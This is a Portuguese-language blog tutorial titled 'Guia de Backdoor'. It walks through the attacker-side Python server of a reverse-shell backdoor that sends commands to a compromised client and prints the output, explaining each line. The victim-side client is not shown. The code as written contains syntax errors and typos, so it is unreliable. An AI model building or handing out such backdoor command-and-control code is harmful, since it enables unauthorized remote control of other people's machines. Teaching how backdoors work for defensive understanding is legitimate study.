---
title: "Guia de Backdoor"
date: 2024-12-10 14:50:00 -0300
categories: [Guia]
tags: [Backdoor, APT-Técnicas]
---

![imagem](https://i.pinimg.com/736x/ae/f0/c1/aef0c11a232964100d4f5b7780f2b930.jpg)

# um Guia sobre Backdoors

> [!NOTE]
> Conteúdo desse Guia
* Como funciona um Backdoor
* Como fazer um simples Backdoor usando python

# um Backdoor simples em python
Nesse exemplo demonstro um Backdoor que usa uma reverse shell e estabelece uma conexão com o alvo para a maquina
do atacante do ataque, permitindo o atacante enviar comandos e receber outputs(saídas) do alvo.

* O código usa a biblioteca socket pra fazer a comunicação entre os Hosts

# Servidor

```
import socket

#comunicação do servidor
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind('localhost', 8080)) #o ip padrão e localhost, e porta 8080
s.listen(1)

#quando estabelecida a conexão, printa conectado e o addr(ip do cliente)
while True:
    conn, addr = s.accept()
    print(f"[+]Conectado a {addr}")

#o looping que permite o servidor enviar comandos pro cliente e receber 
    while True:
        command = input("Shell > ")
        if command == 'exit':
          conn.send(b'exit')
          conn.close()
          break
        else:
            conn.send(command.encode())
            output = conn.recv(1024))
            print(outut.decode())
```

>[!NOTE]
> Explicação mais detalhada do código para qualquer um entender
> um pouco de programação

# como configurar um servidor de socket

```s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)```
* s -> cria um novo objeto de socket
* socket.AF_INET -> especifica que o socket usará o protocolo IPv4
* socket.SOCK_STREAM -> indica que o socket será do tipo TCP

```s.bind(('localhost', 8080))```
* o método bind associa o socket a um endereço IP e uma porta específicos
* Nesse caso, o servidor foi vinculado ao endereço localhost e à porta 8080

```s.listen(1)```
* o método listen coloca o socket em modo de escuta, aguardando conexões de clientes.
* o parâmetro 1 especifica o número máximo de conexões que podem ser enfileiradas. Nesse caso, o servidor aceitará uma conexão à espera de outra.

# como estabelecer conexões de clientes no servidor socket

```while True```
* um looping que permite que o servidor continue aceitando conexões até que seja interrompido.

```conn, addr = s.accept()```
* o método accept aguarda até que um cliente se conecte ao servidor. quando o cliente se conecta, accept retorna dois valores:
  
<ins>conn</ins>: um objeto de socket que permite a comunicação com o cliente.
<ins>addr</ins>:  uma tupla contendo o endereço Ip e a porta do cliente conectado.
  
```print(f"[+] Conectado a {addr}")```
* imprime uma mensagem no console indicando que a conexão foi estabelecida e mostra o endereço do cliente (addr)

# como estabelecer um looping que permite ao servidor enviar comandos a um cliente conectado e processar as respostas

```while True```
* um looping que permite que o servidor continue aceitando conexões até que seja interrompido.

```command = input("Shell >")```
* solicita ao usuário que insira um comando (input), exibindo o promt "shell >"

```if command == 'exit'```
* veridica se o comando inserido pelo usuário é "exit"

```conn.send(b'exit')```
* se o comando for "exit", o servidor envia uma mensagem ao cliente para indicar que a conexão deve ser encerrada. A mensagem é enviada como bytes.

  ```conn.close```
  * fecha a conexão com o cliente.
 
  ```break```
  * sai(termina) o loop, interrompendo a execução
   
```else```
  * se o comando não for "exit", o servidor executa o bloco de código a seguir.

```conn.send(command.encode())```
* o comando e inserido é enviado ao cliente após ser convertido para bytes com encode().

```output = conn.recv(1024)```
* o servidor aguarda e recebe a resposta do cliente, lendo até 1024 bytes de dados

```print(output.decode())```
* a resposta recebida é convertida de bytes de volta para uma string decode() e é impressa no terminal do servidor.
